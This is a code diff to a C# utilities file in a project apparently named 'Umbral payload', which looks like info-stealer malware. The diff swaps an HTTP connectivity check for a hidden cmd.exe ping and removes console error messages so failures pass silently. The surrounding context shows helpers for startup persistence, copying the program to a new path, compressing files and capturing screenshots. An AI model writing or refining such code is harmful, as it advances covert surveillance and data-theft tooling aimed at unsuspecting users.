@@ -9,6 +9,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Drawing;
 using System.Net.Http;
+using System.Diagnostics;
 
 namespace Umbral.payload.Components.Utilities
 {
@@ -16,19 +17,17 @@ namespace Umbral.payload.Components.Utilities
     {
         internal static async Task<bool> IsConnectionAvailable()
         {
-            try
-            {
-                using (HttpClient httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(5.0) })
-                {
-                    HttpResponseMessage response = await httpClient.GetAsync("https://gstatic.com/generate_204");
-                    return response.StatusCode ==
-                           HttpStatusCode.NoContent;
-                }
-            }
-            catch
-            {
-                return false;
-            }
+            Process p = new Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.Arguments = "/c ping www.google.com";
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.UseShellExecute = false;
+            p.Start();
+            string output = p.StandardOutput.ReadToEnd();
+            if (output.EndsWith("again.\r\n"))
+                return false; //no connection
+            else
+                return true;
         }
 
         internal static bool IsInStartup()
@@ -46,8 +45,7 @@ namespace Umbral.payload.Components.Utilities
             }
             catch
             {
-                Console.WriteLine("Failed getting current directory");
-                return false;
+                return false; //Failed getting current directory
             }
         }
 
@@ -73,10 +71,7 @@ namespace Umbral.payload.Components.Utilities
             {
                 File.Copy(currentPath, newFilePath, true);
             }
-            catch (Exception e)
-            {
-                Console.WriteLine(e);
-            }
+            catch { } //Probably no premission
         }
 
         internal static bool Compress(string src, string dst)
@@ -116,10 +111,7 @@ namespace Umbral.payload.Components.Utilities
                         results.Add((Bitmap)bitmap.Clone());
                     }
                 }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e);
-                }
+                catch { }
             }
 
             return results.ToArray();
